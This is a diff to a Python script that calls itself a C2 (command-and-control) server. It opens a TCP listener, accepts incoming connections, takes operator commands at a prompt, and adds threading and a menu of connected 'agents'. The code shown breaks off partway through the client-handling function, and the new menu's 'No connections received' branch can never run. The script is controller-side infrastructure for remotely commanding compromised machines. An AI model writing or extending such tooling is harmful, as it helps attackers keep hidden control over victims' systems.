@@ -1,18 +1,20 @@
 import socket
+import threading
 import sys
 
+thread_index = []
+
 def start_server(host='', port=6789):
-    global addr
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     try:
         server_socket.bind((host, port))
         server_socket.listen(5)
-        print(f"Listening at {host}:{port}")
+        print(f"Listening at {host}:{port}\nWaiting for incoming connections.")
         while True:
             client_socket, addr = server_socket.accept()
             print(f"Accepted connection from {addr}\nUse '!close' to close the connection\nUse '!exit' to terminate the C2 server\n")
-            handle_client(client_socket)
+            handle_client(client_socket, addr)
     except KeyboardInterrupt:
         print("\n\nServer shutting down...")
     finally:
@@ -20,9 +22,15 @@ def start_server(host='', port=6789):
         print("Server terminated.\n")
         sys.exit(0)
 
+def menu():
+    print("""--- Agents connected ---""")
+    for entry in thread_index:
+        if len(thread_index) > 0:
+            print(entry)
+        else:
+            print("No connections received.")
 
-def handle_client(client_socket):
-    global addr
+def handle_client(client_socket, addr):
     try:
         while True:
             prompt = input('>>> ')
